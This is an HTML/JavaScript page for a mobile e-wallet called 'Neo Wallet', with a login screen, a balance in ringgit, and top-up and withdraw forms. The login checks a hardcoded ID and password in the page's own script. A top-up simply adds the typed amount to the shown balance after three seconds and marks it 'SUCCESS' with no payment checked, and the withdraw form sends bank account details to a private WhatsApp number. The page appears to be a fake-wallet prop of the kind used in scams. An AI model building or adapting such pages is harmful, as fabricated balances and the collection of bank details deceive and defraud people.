<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Neo Wallet</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:system-ui,sans-serif;
}

body{
    background:linear-gradient(160deg,#071a2f,#0b2a4a,#06121f);
    color:white;
}

/* LOGIN */
#loginPage{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

.login{
    width:90%;
    max-width:360px;
    background:rgba(255,255,255,0.06);
    backdrop-filter:blur(10px);
    padding:25px;
    border-radius:20px;
    text-align:center;
}

.login img{
    width:70px;
    margin-bottom:10px;
}

input{
    width:100%;
    padding:12px;
    margin:6px 0;
    border:none;
    border-radius:10px;
    background:rgba(255,255,255,0.08);
    color:white;
}

button{
    width:100%;
    padding:12px;
    border:none;
    border-radius:10px;
    font-weight:bold;
    background:#3b82f6;
    color:white;
}

/* APP */
#app{display:none;}

/* HEADER */
.header{
    display:flex;
    justify-content:space-between;
    padding:18px;
    align-items:center;
}

.brand{
    display:flex;
    gap:10px;
    align-items:center;
    font-weight:bold;
}

.brand img{
    width:32px;
    border-radius:8px;
}

/* CARD */
.card{
    margin:15px;
    padding:20px;
    border-radius:20px;
    background:linear-gradient(135deg,#2563eb,#1d4ed8);
}

.balance{
    font-size:32px;
    font-weight:bold;
}

/* USER INFO */
.userinfo{
    margin:15px;
    font-size:13px;
    opacity:0.8;
}

/* MENU */
.menu{
    display:flex;
    justify-content:space-around;
    margin:15px;
}

.menu div{
    text-align:center;
    font-size:12px;
    cursor:pointer;
}

.icon{
    width:55px;
    height:55px;
    border-radius:50%;
    display:flex;
    justify-content:center;
    align-items:center;
    background:rgba(255,255,255,0.08);
    margin-bottom:5px;
}

.icon img{
    width:28px;
}

/* BOX */
.box{
    margin:15px;
    padding:15px;
    background:rgba(255,255,255,0.06);
    border-radius:15px;
    display:none;
}

.btn{
    background:#22c55e;
    margin-top:8px;
}

/* HISTORY */
.tx{
    background:rgba(255,255,255,0.05);
    padding:10px;
    border-radius:10px;
    margin-top:8px;
    font-size:13px;
}

/* NAV */
.nav{
    position:fixed;
    bottom:0;
    width:100%;
    display:flex;
    justify-content:space-around;
    background:rgba(0,0,0,0.4);
    padding:10px 0;
}

.nav img{
    width:22px;
}
</style>
</head>

<body>

<!-- LOGIN -->
<div id="loginPage">
    <div class="login">
        <img src="./logo.png">
        <h2>Neo Wallet</h2>
        <input id="id" placeholder="ID">
        <input id="pw" type="password" placeholder="Password">
        <button onclick="login()">Masuk</button>
    </div>
</div>

<!-- APP -->
<div id="app">

<div class="header">
    <div class="brand">
        <img src="./logo.png">
        Neo Wallet
    </div>
</div>

<div class="card">
    <div>Saldo Tersedia</div>
    <div class="balance">RM <span id="saldo">0.00</span></div>
</div>

<!-- USER -->
<div class="userinfo" id="userInfo"></div>

<!-- MENU -->
<div class="menu">

    <div onclick="show('topup')">
        <div class="icon"><img src="./logo.png"></div>
        Top Up
    </div>

    <div onclick="show('wd')">
        <div class="icon"><img src="./logo.png"></div>
        Withdraw
    </div>

</div>

<!-- TOPUP -->
<div class="box" id="topup">
    <input id="tamount" placeholder="Jumlah">
    <button class="btn" onclick="topup()">Top Up</button>
</div>

<!-- WD -->
<div class="box" id="wd">
    <input id="wamount" placeholder="Jumlah">
    <input id="bank" placeholder="Bank">
    <input id="rek" placeholder="No Rekening">
    <input id="nama" placeholder="Nama">
    <button class="btn" onclick="withdraw()">Withdraw</button>
</div>

<!-- HISTORY -->
<div style="margin:15px;">
    <h4>Riwayat Transaksi</h4>
    <div id="log"></div>
</div>

<!-- NAV -->
<div class="nav">
    <div><img src="./logo.png"><br>Home</div>
    <div><img src="./logo.png"><br>Wallet</div>
    <div><img src="./logo.png"><br>Akun</div>
</div>

</div>

<script>

const admin="6287837571429";

let user={
    id:"BRI581",
    pass:"ATOKABAH77",
    nama:"Zainuddi bin Hasan",
    saldo:100000
};

function formatRM(x){
    return Number(x||0).toLocaleString("ms-MY",{minimumFractionDigits:2});
}

/* 🔊 SOUND */
function sound(type="ok"){
    let ctx=new (window.AudioContext||window.webkitAudioContext)();
    let o=ctx.createOscillator();
    let g=ctx.createGain();

    o.connect(g);
    g.connect(ctx.destination);

    o.frequency.value=type=="error"?300:700;
    g.gain.value=0.2;

    o.start();
    setTimeout(()=>o.stop(),200);
}

/* 🔊 MONEY IN */
function moneyIn(){
    let ctx=new (window.AudioContext||window.webkitAudioContext)();

    let o1=ctx.createOscillator();
    let o2=ctx.createOscillator();
    let g=ctx.createGain();

    o1.frequency.value=880;
    o2.frequency.value=660;

    o1.connect(g);
    o2.connect(g);
    g.connect(ctx.destination);

    g.gain.value=0.2;

    o1.start();
    o2.start();

    setTimeout(()=>{
        o1.stop();
        o2.stop();
    },300);
}

/* LOGIN */
function login(){
    let id=document.getElementById("id").value;
    let pw=document.getElementById("pw").value;

    if(id==user.id && pw==user.pass){
        document.getElementById("loginPage").style.display="none";
        document.getElementById("app").style.display="block";

        document.getElementById("saldo").innerText=formatRM(user.saldo);

        document.getElementById("userInfo").innerText =
        user.nama+" | "+user.id;

    }else{
        alert("Login gagal");
    }
}

/* SHOW */
function show(x){
    document.getElementById("topup").style.display="none";
    document.getElementById("wd").style.display="none";
    document.getElementById(x).style.display="block";
}

/* LOG */
function log(t,s="PENDING"){
    let d=document.createElement("div");
    d.className="tx";
    d.innerText=`🟡 ${t} [${s}]`;
    document.getElementById("log").prepend(d);
}

/* TOPUP */
function topup(){
    let j=document.getElementById("tamount").value;

    if(!j){sound("error");return;}

    let msg=`TOP UP\nID:${user.id}\nRM ${j}\nPENDING`;

    window.location=`https://wa.me/${admin}?text=${encodeURIComponent(msg)}`;

    log("Top Up RM "+j,"PENDING");
    sound();

    setTimeout(()=>{
        user.saldo+=Number(j);
        document.getElementById("saldo").innerText=formatRM(user.saldo);

        moneyIn();
        log("Saldo Masuk RM "+j,"SUCCESS");
    },3000);
}

/* WITHDRAW */
function withdraw(){
    let j=document.getElementById("wamount").value;
    let bank=document.getElementById("bank").value;
    let rek=document.getElementById("rek").value;
    let nama=document.getElementById("nama").value;

    if(!j||!bank||!rek||!nama){
        sound("error");
        return;
    }

    let msg=`WITHDRAW\nID:${user.id}\n${nama}\n${bank}\n${rek}\nRM ${j}\nPENDING`;

    window.location=`https://wa.me/${admin}?text=${encodeURIComponent(msg)}`;

    log("Withdraw RM "+j,"PENDING");
    sound();
}

</script>

</body>
</html>
